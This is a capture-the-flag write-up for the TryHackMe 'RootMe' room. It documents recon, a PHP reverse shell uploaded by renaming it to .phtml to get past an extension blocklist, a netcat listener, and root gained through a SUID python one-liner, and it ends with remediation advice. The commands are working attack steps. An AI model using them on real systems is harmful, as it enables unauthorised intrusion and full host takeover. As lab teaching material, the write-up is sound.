# RootMe — TryHackMe

**Platform:** TryHackMe  **Difficulty:** Easy  **Category:** Web Exploitation / Linux Privilege Escalation

## Executive Summary & Methodology
RootMe packages the two most common web-to-root paths seen in real environments into a single host: an upload filter that blocklists instead of allowlists, and a SUID bit left on an interpreter. Neither is subtle, which is precisely why speed and a repeatable process matter — recon, foothold, stabilize, enumerate SUID, escalate. This report documents that chain end to end, including the filter bypass that made initial access possible.

---

## Phase 1: Enumeration

### The Initial Scan
```bash
nmap -sV -sC -oN initial_scan.txt <Target_IP>
```

**Critical Findings:**
* **Port 22 (SSH):** OpenSSH — pivot potential only.
* **Port 80 (HTTP):** Apache. The application layer, and the way in.

### Web Content Discovery
Directory brute-forcing surfaced the two paths that define this box:

```bash
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt
```

* `/panel` → an unauthenticated file-upload form.
* `/uploads` → the directory where submitted files are stored *and served*.

An upload endpoint feeding a web-accessible, script-executing directory is an upload-to-RCE primitive waiting to be used.

*Risk Analysis Note: The absence of authentication on `/panel` is itself a finding — an anonymous file-upload endpoint is an open door before a single payload is crafted.*

---

## Phase 2: Exploitation — Upload Filter Bypass

### Error & Correction 1: The Extension Filter
* **The Action:** Uploading a standard PHP reverse shell (`shell.php`).
* **The Error:** The `/panel` filter rejects `.php`.
* **The Correction:** The filter is an extension blocklist, and Apache will still execute other PHP-associated extensions. Renaming the payload to `.phtml` slipped past the filter while remaining executable server-side.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml
# edit shell.phtml: set $ip to the attack-box IP, $port = 1234
hostname -I   # confirm the correct attack-box IP first
```

### Catching the Shell
The listener is started **before** triggering execution; the payload is then invoked by browsing to it in `/uploads`.

```bash
nc -lvnp 1234
# trigger:  http://<Target_IP>/uploads/shell.phtml
```

```text
Connection received on <Target_IP>
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Foothold established as `www-data`.

### Shell Stabilization
The raw shell lacks job control and a proper TTY, which breaks interactive commands. Upgrading it first prevents wasted time downstream:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

The **user flag** was readable from the web user's reachable directories. *(Value intentionally omitted — solve the room.)*

---

## Phase 3: Privilege Escalation — SUID Interpreter

### Hunting SUID Binaries
SUID files execute with their owner's privileges (root) regardless of who runs them. A SUID bit on an interpreter is an immediate escalation, because an interpreter can spawn a shell.

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# ...
# -rwsr-xr-x 1 root root  /usr/bin/python   <-- SUID on an interpreter
```

### Escalating via GTFOBins
A SUID `python` is documented on GTFOBins. The `-p` flag on the spawned shell is essential — it preserves the elevated effective UID rather than dropping back to `www-data`:

```bash
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
whoami
# root
```

The **root flag** resided in root's home directory — the host was fully compromised. *(Value intentionally omitted.)*

```bash
ls -la /root
less /root/root.txt
```

---

## Business & Operational Risk Impact
* **SUID on an Interpreter (Critical):** Converts any low-privilege foothold into root. SUID must never be set on `python`, `perl`, `bash`, or similar; the SUID inventory (`find / -perm -4000`) should be audited and minimized routinely.
* **Insecure File Upload:** Blocklisting `.php` misses `.phtml`, `.php5`, `.phar`, and more. Uploads must be validated against an allowlist, verified by content rather than extension, stored outside the web root with randomized names, and served from a location where script execution is disabled.
* **Missing Authentication & Egress Controls:** An anonymous upload panel provided the entry point, and an unrestricted outbound connection allowed the reverse shell to call home. Authentication on administrative functions and outbound firewall rules would each have broken the chain independently.
* **Business Impact:** From an unauthenticated position, an attacker achieved root on the host — total control over the application, its data, and any credentials or connected systems reachable from it.
